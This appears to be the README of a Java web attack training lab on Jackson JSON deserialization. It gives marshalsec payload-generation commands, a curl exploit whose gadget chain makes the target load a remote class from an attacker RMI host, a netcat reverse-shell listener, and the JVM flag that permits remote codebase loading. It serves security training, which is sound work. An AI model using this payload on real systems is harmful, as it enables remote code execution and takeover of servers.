## Java Web Attacks Training Plattform

#### Introduction

You can use this plattform to develop and experiment with existing java web attacks.

#### JSON Deserialization

Payload Generation via [marshalsec](https://github.com/mbechler/marshalsec/)
```
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson -a -v
java -cp marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.JsonIO -a -v
```

Exploitation Code
```
curl -x "" -H "Content-Type: application/json" -X POST -d '{"id":133,"object":["org.springframework.beans.factory.config.PropertyPathFactoryBean",{"targetBeanName":"rmi://192.168.34.42:1099/EvilObject","propertyPath":"foo","beanFactory": ["org.springframework.jndi.support.SimpleJndiBeanFactory",{"shareableResources":["rmi://192.168.34.42:1099/EvilObject"]}]}]}' http://192.168.34.9:8443/api/jackson
```
Reverse Shell
```
netcat -lkvp 31338
```

The vulnerable endpoint needs the permission to download the evil class file located in /exploit/EvilObject.class

-.-

```
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```

#### Deserialization Details

##### Jackson

Jackson needs to enable the [JacksonPolymorphicDeserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization) to be affected against the deserialization vulnerability.